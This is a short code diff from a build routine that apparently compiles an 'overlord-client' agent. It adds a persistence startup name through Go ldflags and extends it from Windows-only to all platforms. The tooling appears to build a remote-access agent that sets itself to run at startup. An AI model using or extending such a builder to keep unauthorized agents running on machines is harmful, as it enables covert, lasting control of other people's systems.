@@ -713,7 +713,7 @@ func runBoundFiles() {
             ? config.persistenceMethods
             : ['startup'];
           sendToStream({ type: "output", text: `Persistence enabled for ${platform} (methods: ${activeMethods.join(', ')})\n`, level: "info" });
-          if (os === 'windows' && config.startupName) {
+          if (config.startupName) {
             const startupNameFlag = `-X overlord-client/cmd/agent/persistence.DefaultStartupName=${config.startupName}`;
             ldflags = `${ldflags} ${startupNameFlag}`;
             sendToStream({ type: "output", text: `Startup name: ${config.startupName}\n`, level: "info" });
